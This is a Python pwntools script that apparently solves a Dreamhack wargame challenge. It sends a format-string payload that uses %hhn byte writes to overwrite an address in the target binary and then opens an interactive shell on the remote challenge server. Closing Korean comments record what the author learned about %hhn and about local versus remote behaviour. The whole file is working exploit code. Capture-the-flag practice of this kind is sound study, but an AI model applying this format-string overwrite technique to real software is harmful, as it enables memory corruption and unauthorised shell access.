#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 10203)
# elf = pwn.ELF("./basic_exploitation_003") #

# get_shell = 0x08048669 #

target = 0x0804a010

payload = pwn.p32(target)
payload += pwn.p32(target+1)
payload += b"%97c"
payload += b"%1$hhn"
payload += b"%29c"
payload += b"%2$hhn"

p.send(payload)
p.interactive()


"""
%hn 외에 %hhn도 있다는 것을 알 수 있었다.(1 Byte씩 저장)
문제 파일을 다운로드 받아서 C 파일을 다시 컴파일 할 경우 기본 파일과 함수 주소 등 차이가 생긴다.
분명 로컬 환경에서는 Segmentation Fault가 발생하는데 원격에 접속하면 정상적으로 동작하는 경우도 있다.
"""
